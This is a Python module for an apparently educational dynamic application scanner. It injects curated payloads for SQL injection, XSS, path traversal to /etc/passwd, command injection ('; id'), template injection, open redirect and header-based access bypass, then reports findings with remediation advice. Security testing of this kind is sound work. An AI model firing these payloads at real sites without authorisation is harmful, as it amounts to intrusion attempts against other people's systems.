"""Active security research scanner (offensive DAST) — education & research.

This is the offensive counterpart to the passive analysis in ``ai/brain.py``.
It performs the same kind of *active* probing that OWASP ZAP / Burp's active
scanner / sqlmap perform: it injects a small, curated, well-known set of test
payloads into discovered parameters and classifies the responses to surface
*and explain* injection-class weaknesses, with concrete remediation.

It is intentionally **bounded** (few payloads per class, capped injection
points, per-request timeout) — it is a teaching/research instrument, not a
flooding tool. Like every other AEGIS run it only executes after
``safety.enforce`` has authorised the target.

Educational use only. See ``aegis.EDU_NOTICE``.
"""

from __future__ import annotations

import asyncio
import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from .models import RequestSpec, Severity, Vulnerability

# --------------------------------------------------------------------------- #
# Curated, standard teaching payloads (OWASP Testing Guide style).
# --------------------------------------------------------------------------- #
PAYLOADS: dict[str, list[str]] = {
    "sqli_error": ["'", '"', "')", "' OR '1'='1", "1' OR '1'='1' -- "],
    "sqli_time": ["1' AND SLEEP(3)-- ", "1); SELECT pg_sleep(3)-- "],
    "xss": ["<aegisXSS>", "\"'><svg/onload=1>", "javascript:alert(1)"],
    "traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
    "cmdi": ["; id", "| id", "$(id)", "`id`"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}"],
    "redirect": ["https://aegis.invalid/owned", "//aegis.invalid/owned"],
    "nosqli": ['{"$gt": ""}', "[$ne]=1"],
}

SQL_ERR_SIGS = ("sql syntax", "mysql_fetch", "pg_query", "ora-0", "sqlite3.",
                "unclosed quotation", "odbc", "syntax error at or near",
                "you have an error in your sql")
TRAVERSAL_SIGS = ("root:x:0:0:", "root:.*:0:0", "[boot loader]", "; for 16-bit")
CMDI_SIGS = ("uid=", "gid=", "groups=")
HEADER_BYPASS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Forwarded-Host": "aegis.invalid"},
]


def _inject_url(url: str, key: str, value: str) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q[key] = value
    return urlunparse(p._replace(query=urlencode(q)))


def _points(spec: RequestSpec, max_points: int) -> list[tuple[str, str]]:
    """Discover injection points: returns (kind, name)."""
    pts: list[tuple[str, str]] = []
    for k, _ in parse_qsl(urlparse(spec.url).query, keep_blank_values=True):
        pts.append(("query", k))
    if spec.body and "=" in spec.body and "{" not in spec.body:
        for k, _ in parse_qsl(spec.body, keep_blank_values=True):
            pts.append(("form", k))
    if not pts:
        # No params discovered: still test a synthetic query param + headers.
        pts.append(("query", "q"))
    return pts[:max_points]


class OffensiveScanner:
    """Bounded active scanner. Authorised, educational, research-grade."""

    def __init__(
        self,
        specs: list[RequestSpec],
        *,
        timeout: float = 12.0,
        max_points: int = 6,
        concurrency: int = 8,
    ) -> None:
        self.specs = [s.normalised() for s in specs]
        self.timeout = timeout
        self.max_points = max_points
        self.sem = asyncio.Semaphore(concurrency)

    # ------------------------------------------------------------------ #
    async def _send(self, client, method, url, *, headers=None, body=None):
        async with self.sem:
            t0 = time.perf_counter()
            try:
                r = await client.request(
                    method, url, headers=headers,
                    content=body.encode() if body else None,
                )
                return r.status_code, r.text, (time.perf_counter() - t0), dict(r.headers)
            except Exception as exc:
                return 0, f"__error__:{type(exc).__name__}", (
                    time.perf_counter() - t0), {}

    async def _scan_spec(self, client, spec: RequestSpec) -> list[Vulnerability]:
        out: list[Vulnerability] = []
        base_code, base_body, base_t, _ = await self._send(
            client, spec.method, spec.url, headers=spec.headers or None,
            body=spec.body,
        )
        base_len = len(base_body)

        def V(t, sev, desc, rem, ev):
            return Vulnerability(t, desc, sev, spec.url, rem, ev[:300],
                                 "active-scan")

        for kind, name in _points(spec, self.max_points):
            # --- SQLi (error-based) ---
            for pl in PAYLOADS["sqli_error"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                low = body.lower()
                if any(s in low for s in SQL_ERR_SIGS):
                    out.append(V("SQL Injection (error-based)", Severity.CRITICAL,
                                 f"Payload in '{name}' triggered a database error "
                                 "— indicates unsanitised SQL.",
                                 "Use parameterised queries / prepared statements; "
                                 "never concatenate input into SQL.",
                                 f"{name}={pl} -> SQL error in response"))
                    break

            # --- SQLi (time-based) ---
            for pl in PAYLOADS["sqli_time"]:
                code, body, dt, _ = await self._probe(client, spec, kind, name, pl)
                if dt > base_t + 2.5 and "__error__" not in body:
                    out.append(V("SQL Injection (time-based blind)",
                                 Severity.CRITICAL,
                                 f"Injecting a SLEEP into '{name}' delayed the "
                                 f"response by {dt - base_t:.1f}s.",
                                 "Parameterise queries; add input validation and "
                                 "query timeouts.",
                                 f"{name}={pl} -> +{dt - base_t:.1f}s"))
                    break

            # --- Reflected XSS ---
            for pl in PAYLOADS["xss"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if pl in body and "<aegisxss>" in body.lower() or (
                        "<svg/onload=1>" in body):
                    out.append(V("Reflected XSS", Severity.HIGH,
                                 f"Payload in '{name}' is reflected unencoded in "
                                 "the response body.",
                                 "Context-aware output encoding; set a strict "
                                 "Content-Security-Policy.",
                                 f"{name}={pl} reflected verbatim"))
                    break

            # --- Path traversal ---
            for pl in PAYLOADS["traversal"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if any(sig in body for sig in TRAVERSAL_SIGS):
                    out.append(V("Path Traversal / LFI", Severity.CRITICAL,
                                 f"'{name}' returned OS file contents.",
                                 "Canonicalise & allow-list paths; never pass "
                                 "user input to filesystem APIs.",
                                 f"{name}={pl} -> system file leaked"))
                    break

            # --- OS command injection ---
            for pl in PAYLOADS["cmdi"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if all(s in body for s in ("uid=", "gid=")):
                    out.append(V("OS Command Injection", Severity.CRITICAL,
                                 f"Shell metacharacters in '{name}' produced "
                                 "command output.",
                                 "Avoid shell calls; use safe APIs and strict "
                                 "argument allow-lists.",
                                 f"{name}={pl} -> id output"))
                    break

            # --- SSTI ---
            for pl in PAYLOADS["ssti"]:
                code, body, _, _ = await self._probe(client, spec, kind, name, pl)
                if "49" in body and pl not in body:
                    out.append(V("Server-Side Template Injection",
                                 Severity.HIGH,
                                 f"'{name}' evaluated a template expression "
                                 "(7*7 => 49).",
                                 "Never render user input as a template; use "
                                 "logic-less templates / sandboxing.",
                                 f"{name}={pl} -> 49"))
                    break

            # --- Open redirect ---
            for pl in PAYLOADS["redirect"]:
                u = _inject_url(spec.url, name, pl)
                code, body, _, hdr = await self._send(client, spec.method, u)
                loc = hdr.get("location", "")
                if "aegis.invalid" in loc:
                    out.append(V("Open Redirect", Severity.MEDIUM,
                                 f"'{name}' controls the redirect target.",
                                 "Allow-list redirect destinations; use relative "
                                 "paths or mapped tokens.",
                                 f"Location: {loc}"))
                    break

        # --- Header-based access-control bypass probes ---
        for hb in HEADER_BYPASS:
            h = {**(spec.headers or {}), **hb}
            code, body, _, _ = await self._send(
                client, spec.method, spec.url, headers=h, body=spec.body)
            if base_code in (401, 403) and code == 200:
                out.append(V("Access-Control Bypass via Headers",
                             Severity.HIGH,
                             f"Adding {list(hb)[0]} changed {base_code} -> 200.",
                             "Never trust client-supplied forwarding/override "
                             "headers for authorisation decisions.",
                             f"{hb} -> {code}"))
        return out

    async def _probe(self, client, spec, kind, name, payload):
        if kind == "query":
            return await self._send(
                client, spec.method, _inject_url(spec.url, name, payload),
                headers=spec.headers or None, body=spec.body)
        # form body
        body_pairs = dict(parse_qsl(spec.body or "", keep_blank_values=True))
        body_pairs[name] = payload
        return await self._send(
            client, spec.method, spec.url, headers=spec.headers or None,
            body=urlencode(body_pairs))

    # ------------------------------------------------------------------ #
    async def run(self) -> list[Vulnerability]:
        limits = httpx.Limits(max_connections=16)
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(self.timeout), follow_redirects=False,
            verify=False, limits=limits,
        ) as client:
            seen: set[tuple[str, str]] = set()
            uniq = [s for s in self.specs
                    if (s.method, s.url.split("?")[0]) not in seen
                    and not seen.add((s.method, s.url.split("?")[0]))]
            results = await asyncio.gather(
                *(self._scan_spec(client, s) for s in uniq[:25]),
                return_exceptions=True,
            )
        out: list[Vulnerability] = []
        for r in results:
            if isinstance(r, list):
                out.extend(r)
        return out


def active_scan(specs: list[RequestSpec], *, timeout: float = 12.0) -> list[Vulnerability]:
    """Synchronous entry point used by the orchestrator."""
    scanner = OffensiveScanner(specs, timeout=timeout)
    return asyncio.run(scanner.run())
